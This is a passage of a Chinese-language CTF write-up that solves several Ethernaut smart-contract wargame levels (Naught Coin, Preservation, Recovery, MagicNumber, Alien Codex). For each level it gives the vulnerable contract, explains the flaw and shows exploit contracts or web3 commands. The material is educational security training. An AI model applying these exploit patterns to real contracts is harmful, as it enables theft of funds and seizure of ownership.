function_">gateThree</span>(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.<span class="property">origin</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>msg.sender !&#x3D; tx.origin，部署第三方合约调用即可</li>
<li>当前 caller 的 codesize 为 0，当合约还没创建完成的时候 codesize 为 0，因此写在 constructor 里即可</li>
<li>gateKey 异或 sender 的 keccak256 的前 8 字节为 0-1&#x3D;0xFFFFFFFFFFFFFFFF，本地计算然后传过去即可</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GatekeeperTwo</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line">contract <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="title class_">GatekeeperTwo</span> challenge;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _addr</span>) public &#123;</span><br><span class="line">        challenge = <span class="title class_">GatekeeperTwo</span>(_addr);</span><br><span class="line">		uint64 gateKey = (<span class="title function_">uint64</span>(<span class="number">0</span>) - <span class="number">1</span>) ^ <span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="variable language_">this</span>))));</span><br><span class="line">		challenge.<span class="title function_">enter</span>(<span class="title function_">bytes8</span>(gateKey));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><p>NaughtCoin 是一种 ERC20 代币，而且您已经持有这些代币。问题是您只能在 10 年之后才能转移它们。您能尝试将它们转移到另一个地址，以便您可以自由使用它们吗？通过将您的代币余额变为 0 来完成此关卡。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract <span class="title class_">NaughtCoin</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span></span><br><span class="line">  <span class="comment">// string public constant symbol = &#x27;0x0&#x27;;</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 public <span class="variable constant_">INITIAL_SUPPLY</span>;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _player</span>) </span><br><span class="line">  <span class="title class_">ERC20</span>(<span class="string">&#x27;NaughtCoin&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    <span class="variable constant_">INITIAL_SUPPLY</span> = <span class="number">1000000</span> * (<span class="number">10</span>**<span class="title function_">uint256</span>(<span class="title function_">decimals</span>()));</span><br><span class="line">    <span class="comment">// _totalSupply = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="comment">// _balances[player] = INITIAL_SUPPLY;</span></span><br><span class="line">    <span class="title function_">_mint</span>(player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="title function_">address</span>(<span class="number">0</span>), player, <span class="variable constant_">INITIAL_SUPPLY</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint256 _value</span>) override public lockTokens <span class="title function_">returns</span>(<span class="params">bool</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">transfer</span>(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier <span class="title function_">lockTokens</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.<span class="property">sender</span> == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ERC20的子合约	<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">ERC20.sol </a></p>
<p>题目中只override了transfer函数，让我们10年后才能取钱，但是并没有重写这个transferFrom函数，可以尝试利用这个函数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract <span class="title class_">ERC20</span> is <span class="title class_">Context</span>, <span class="title class_">IERC20</span>, <span class="title class_">IERC20Metadata</span> &#123;</span><br><span class="line">	<span class="comment">//……</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint256 amount</span>) public virtual override returns (bool) &#123;</span><br><span class="line">        address owner = <span class="title function_">_msgSender</span>();</span><br><span class="line">        <span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">        address to,</span></span><br><span class="line"><span class="params">        uint256 amount</span></span><br><span class="line"><span class="params">    </span>) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = <span class="title function_">_msgSender</span>();</span><br><span class="line">        <span class="title function_">_spendAllowance</span>(<span class="keyword">from</span>, spender, amount);</span><br><span class="line">        <span class="title function_">_transfer</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_approve</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address owner,</span></span><br><span class="line"><span class="params">        address spender,</span></span><br><span class="line"><span class="params">        uint256 amount</span></span><br><span class="line"><span class="params">    </span>) internal virtual &#123;</span><br><span class="line">        <span class="built_in">require</span>(owner != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: approve from the zero address&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(spender != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;ERC20: approve to the zero address&quot;</span>);</span><br><span class="line"></span><br><span class="line">        _allowances[owner][spender] = amount;</span><br><span class="line">        emit <span class="title class_">Approval</span>(owner, spender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_spendAllowance</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address owner,</span></span><br><span class="line"><span class="params">        address spender,</span></span><br><span class="line"><span class="params">        uint256 amount</span></span><br><span class="line"><span class="params">    </span>) internal virtual &#123;</span><br><span class="line">        uint256 currentAllowance = <span class="title function_">allowance</span>(owner, spender);</span><br><span class="line">        <span class="keyword">if</span> (currentAllowance != <span class="title function_">type</span>(uint256).<span class="property">max</span>) &#123;</span><br><span class="line">            <span class="built_in">require</span>(currentAllowance &gt;= amount, <span class="string">&quot;ERC20: insufficient allowance&quot;</span>);</span><br><span class="line">            unchecked &#123;</span><br><span class="line">                <span class="title function_">_approve</span>(owner, spender, currentAllowance - amount);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要通过 <code>_spendAllowance(from, spender, amount);</code>  也就是<code>_allowances[owner][spender]&gt;=amount</code></p>
<p>因此先调用approve，给自己授权转账金额，再调用transferFrom把自己的钱转走即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">fromWei</span>(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(player))	<span class="comment">//&#x27;1000000&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(player, web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&quot;1000000&quot;</span>))	<span class="comment">//授权</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">transferFrom</span>(player, contract.<span class="property">address</span>, web3.<span class="property">utils</span>.<span class="title function_">toWei</span>(<span class="string">&quot;1000000&quot;</span>))	<span class="comment">//从自己这里转出去</span></span><br></pre></td></tr></table></figure>

<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><p>获取合约所有权</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Preservation</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// public library contracts </span></span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  <span class="comment">// Sets the function signature for delegatecall</span></span><br><span class="line">  bytes4 constant setTimeSignature = <span class="title function_">bytes4</span>(<span class="title function_">keccak256</span>(<span class="string">&quot;setTime(uint256)&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _timeZone1LibraryAddress, address _timeZone2LibraryAddress</span>) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.<span class="property">sender</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// set the time for timezone 1</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint _timeStamp</span>) public &#123;</span><br><span class="line">    timeZone1Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// set the time for timezone 2</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setSecondTime</span>(<span class="params">uint _timeStamp</span>) public &#123;</span><br><span class="line">    timeZone2Library.<span class="title function_">delegatecall</span>(abi.<span class="title function_">encodePacked</span>(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Simple library contract to set the time</span></span><br><span class="line">contract <span class="title class_">LibraryContract</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// stores a timestamp </span></span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第7关 Delegation 的知识点</p>
<p><code>delegatecall</code>是上下文调用，相当于把代码复制过来在当前的环境执行，<code>storage</code> 等数据均使用自己的，这就使得某些访存操作会错误地处理对象</p>
<p>调用<code>LibraryContract</code>的<code>setTime</code>时，修改的实际上是<code>Preservation</code>合约<code>storage</code>中对应位置的slot0，也就是<code>timeZone1Library</code></p>
<p>可以把这个<code>timeZone1Library</code>变为攻击合约的地址，这样第二次调用<code>setTime</code>时，调用的是攻击合约内的<code>setTime</code>，修改<code>owner</code>即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Preservation</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setFirstTime</span>(<span class="params">uint _timeStamp</span>) external;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setSecondTime</span>(<span class="params">uint _timeStamp</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Attack</span> &#123;</span><br><span class="line">  </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner;  </span><br><span class="line"></span><br><span class="line">  <span class="title class_">Preservation</span> instance;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _instance</span>) public &#123;</span><br><span class="line">    instance = <span class="title class_">Preservation</span>(_instance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">attack_1</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    instance.<span class="title function_">setFirstTime</span>(<span class="title function_">uint</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">attack_2</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    instance.<span class="title function_">setFirstTime</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTime</span>(<span class="params">uint _time</span>) public &#123;</span><br><span class="line">    owner=tx.<span class="property">origin</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先调用 attack_1，再调用 attack_2</p>
<p>调用 attack_2 的时候发生 out of gas 错误，可能是调用的次数有点多，gas估计错误，交易的时候要增大gas限制</p>
<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><p>合约创建者构建了一个非常简单的代币工厂合约。 任何人都可以轻松创建新代币。 在部署第一个代币合约后，创建者发送了 0.001 以太币以获得更多代币。 </p>
<p>此后，他们丢失了合约地址。 如果您可以从丢失的合约地址中恢复（或移除）0.001 以太币，则此 level 将完成。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Recovery</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">SimpleToken</span>(_name, msg.<span class="property">sender</span>, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SimpleToken</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">string memory _name, address _creator, uint256 _initialSupply</span>) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = msg.<span class="property">value</span>.<span class="title function_">mul</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address _to, uint _amount</span>) public &#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount);</span><br><span class="line">    balances[msg.<span class="property">sender</span>] = balances[msg.<span class="property">sender</span>].<span class="title function_">sub</span>(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">destroy</span>(<span class="params">address payable _to</span>) public &#123;</span><br><span class="line">    <span class="title function_">selfdestruct</span>(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了 generateToken 函数生成了一个 SimpleToken，但是不知道生成的合约地址</p>
<p>这个直接去 <a target="_blank" rel="noopener" href="https://rinkeby.etherscan.io/">Rinkeby Etherscan</a> 上看就行</p>
<img src="https://s3.bmp.ovh/imgs/2022/08/01/285db815417a2650.png" alt="image-20220726113844462" style="zoom:67%;" />

<p>查到生成合约的地址为 0xA18a26Cd7ec5E9a8E3AAad7aaecfE3E08ae4e8e3</p>
<p>在 remix 部署 SimpleToken ，使用 <code>At address</code> 指定 <code>lost contract</code> 的地址，然后执行 <code>destroy()</code> 自毁转钱即可</p>
<p>​         </p>
<p>方法二</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/blockchain-articles/179662.html">私钥丢失也能找回以太币？ - FreeBuf网络安全行业门户</a></p>
<p>合约地址是确定性的，由 <code>keccack256(address,nonce)</code> 计算。(其中 <code>address</code> 是合约的地址(或创建交易的以太坊地址)，而 <code>nonce</code> 是合约生产其它合约的一个数值(或者对于常规交易来说是交易的<code>nonce</code>))</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">address = sha3(rlp_encode(creator_account, creator_account_nonce))[12:]</span><br></pre></td></tr></table></figure>

<p>从本质上讲，合约的地址就是账户与交易 nonce 串联的 keccak256 哈希值。</p>
<p>合约的 nonce 是以 1 开始的，账户的交易 nonce 是以 0 开始的。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rlp_encode</span>(<span class="params"><span class="built_in">input</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(<span class="built_in">input</span>,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">input</span>) == <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">ord</span>(<span class="built_in">input</span>) &lt; <span class="number">0x80</span>: <span class="keyword">return</span> <span class="built_in">input</span></span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> encode_length(<span class="built_in">len</span>(<span class="built_in">input</span>), <span class="number">0x80</span>) + <span class="built_in">input</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">isinstance</span>(<span class="built_in">input</span>,<span class="built_in">list</span>):</span><br><span class="line">        output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">input</span>: output += rlp_encode(item)</span><br><span class="line">        <span class="keyword">return</span> encode_length(<span class="built_in">len</span>(output), <span class="number">0xc0</span>) + output</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_length</span>(<span class="params">L,offset</span>):</span><br><span class="line">    <span class="keyword">if</span> L &lt; <span class="number">56</span>:</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">chr</span>(L + offset)</span><br><span class="line">    <span class="keyword">elif</span> L &lt; <span class="number">256</span>**<span class="number">8</span>:</span><br><span class="line">         BL = to_binary(L)</span><br><span class="line">         <span class="keyword">return</span> <span class="built_in">chr</span>(<span class="built_in">len</span>(BL) + offset + <span class="number">55</span>) + BL</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">raise</span> Exception(<span class="string">&quot;input too long&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_binary</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> to_binary(<span class="built_in">int</span>(x / <span class="number">256</span>)) + <span class="built_in">chr</span>(x % <span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> rlp_encode([<span class="string">&quot;295D050a4ebf56105D7d0A9FDECB1331E7b7283B&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>),<span class="string">&quot;01&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)]).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#d694295d050a4ebf56105d7d0a9fdecb1331e7b7283b01</span></span><br></pre></td></tr></table></figure>

<p><code>solidity</code> 计算地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.18;</span><br><span class="line">contract test&#123;</span><br><span class="line">    function func() public view returns (address)&#123;</span><br><span class="line">        return address(keccak256(0xd694295d050a4ebf56105d7d0a9fdecb1331e7b7283b01));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>算出的地址也是 0xA18a26Cd7ec5E9a8E3AAad7aaecfE3E08ae4e8e3</p>
<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><p>题目要求即写一个合约，字节码不超过 10 个字节，在调用 whatIsTheMeaningOfLife() 时返回 42</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">MagicNum</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setSolver</span>(<span class="params">address _solver</span>) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考 <a target="_blank" rel="noopener" href="https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2">Ethernaut Lvl 19 MagicNumber Walkthrough: How to deploy contracts using raw assembly opcodes | by 0xSage | Coinmonks | Medium</a></p>
<p>合约创建的过程</p>
<img src="https://s3.bmp.ovh/imgs/2022/08/13/dac9ac3c4a2fb0b4.jpeg" alt="28" style="zoom:67%;" />

<p>构造字节码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">runtime codes</span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x2a</span>  ; 将 <span class="number">42</span> 压入栈中(<span class="number">42</span>是)</span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x80</span>  ; 要存储的位置，一般为 <span class="number">0x80</span></span><br><span class="line"><span class="variable constant_">MSTORE</span>      ; 设置 memory[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x20</span>] = <span class="number">0x2a</span></span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x20</span>  ; length </span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x80</span>  ; offset</span><br><span class="line"><span class="variable constant_">RETURN</span>      ; <span class="keyword">return</span> memory[<span class="number">0x80</span>:<span class="number">0x80</span>+<span class="number">0x20</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">initialization codes</span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x0a</span>  ; length, runtime code 长度为 <span class="number">10</span> (<span class="number">0x0a</span>)</span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x0c</span>  ; offset, 即 initialization codes 的长度，整体算下来为 <span class="number">0x0C</span></span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x00</span>  ; destOffset, 存入内存中起始位置</span><br><span class="line"><span class="variable constant_">CODECOPY</span>    ; 将 runtime code 拷贝到内存开头</span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x0a</span>  ; length</span><br><span class="line"><span class="title class_">PUSH1</span> <span class="number">0x00</span>  ; offset</span><br><span class="line"><span class="variable constant_">RETURN</span>      ; 返回 runtime code</span><br></pre></td></tr></table></figure>

<p>最后根据 <a target="_blank" rel="noopener" href="https://github.com/crytic/evm-opcodes">crytic&#x2F;evm-opcodes: Ethereum opcodes and instruction reference (github.com)</a></p>
<p>得到最后opcodes  0x600a600c600039600a6000f3602a60805260206080f3</p>
<p>调用web3的sendTransaction创建合约</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">data</span>: <span class="string">&quot;0x600a600c600039600a6000f3602a60805260206080f3&quot;</span>&#125;)</span><br><span class="line">etherscan上得到创建合约的地址</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setSolver</span>(<span class="string">&quot;&lt;contract address&gt;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h2><p>改变合约所有权</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;../helpers/Ownable-05.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AlienCodex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">contacted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">assert</span>(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">make_contact</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) contacted public &#123;</span><br><span class="line">  	codex.<span class="title function_">push</span>(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) contacted public &#123;</span><br><span class="line">    codex.<span class="property">length</span>--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>合约开头 import 了 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol">openzeppelin-contracts&#x2F;Ownable.sol (github.com)</a> 合约，同时也引入了一个 owner 变量</p>
<p>对于数组来说，首先占据一个插槽 slot p，这个插槽里是动态数组的长度，会把输入的<code>index</code>和<code>SLOAD(p)</code>的值进行比较，防止数组越界访问，然后数组的元素存储位置在 <code>keccak256(p)+index</code></p>
<p>此处slot0是owner和contract，slot1是codex数组的长度，codex[i]的存储位置是 <code>keccak256(1) + i</code></p>
<p>只要设计好 i 就能修改slot0</p>
<p>先调用retract()，让length下溢，变为2^256-1，这样就可以访问到全部的 storage 区域</p>
<p>要满足keccak256(1) + i &#x3D; 0 &#x3D; 2^256，得到 i &#x3D; 2^256 - keccak256(1)</p>
